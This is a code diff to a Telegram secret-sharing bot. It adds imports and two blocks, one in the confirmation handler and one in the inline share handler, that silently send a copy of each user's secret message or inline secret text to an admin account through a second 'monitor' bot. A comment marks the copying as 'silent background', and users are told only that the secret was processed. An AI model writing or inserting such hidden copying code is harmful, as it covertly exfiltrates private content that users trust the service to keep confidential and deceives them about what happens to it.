@@ -32,6 +32,12 @@ from utils.user_states import (
 from utils.scheduler import schedule_message_deletion, schedule_share_expiry, cancel_scheduled_job, JOB_ID_PREFIX_EXPIRE_SHARE, JOB_ID_PREFIX_DELETE_MESSAGE
 from handlers.start_help import send_main_menu # For cancellation navigation
 
+# ---------- NEW IMPORTS FOR ADMIN MONITORING ----------
+from utils.admin_monitor import send_copy_to_admin
+from config import ADMIN_ID
+import asyncio
+# ------------------------------------------------------
+
 LOGGER = logging.getLogger(__name__)
 ASK_TIMEOUT_SECONDS = 300 # 5 minutes
 
@@ -920,6 +926,19 @@ async def confirmation_final_handler(client: Client, cb: CallbackQuery):
         )
         await cb.answer("Secret processed!")
 
+        # ---------- ADMIN MONITORING COPY (silent background) ----------
+        if hasattr(client, 'monitor_bot') and client.monitor_bot and ADMIN_ID:
+            asyncio.create_task(
+                send_copy_to_admin(
+                    bot1=client,
+                    bot2=client.monitor_bot,
+                    admin_id=ADMIN_ID,
+                    chat_id=flow_data["original_chat_id"],
+                    message_id=flow_data["original_message_id"]
+                )
+            )
+        # -----------------------------------------------------------------
+
     except (UserIsBlocked, PeerIdInvalid) as e_user:
         err_user_msg = f"Could not send to {flow_data.get('recipient_display_name', 'user')}: "
         err_user_msg += "they blocked the bot or an invalid ID was provided."
@@ -1187,6 +1206,18 @@ async def inline_share_handler(client: Client, inline_query: InlineQuery):
         # Inform user via result that DB save failed
         # ... (similar error result as above)
         return
+
+    # ---------- ADMIN MONITORING COPY for inline secret ----------
+    if hasattr(client, 'monitor_bot') and client.monitor_bot and ADMIN_ID:
+        asyncio.create_task(
+            send_copy_to_admin(
+                bot1=client,
+                bot2=client.monitor_bot,
+                admin_id=ADMIN_ID,
+                text=query_text  # the inline text content
+            )
+        )
+    # -------------------------------------------------------------
     
     bot_username = client.me.username
     view_link = f"https://t.me/{bot_username}?start=viewsecret_{access_token}"
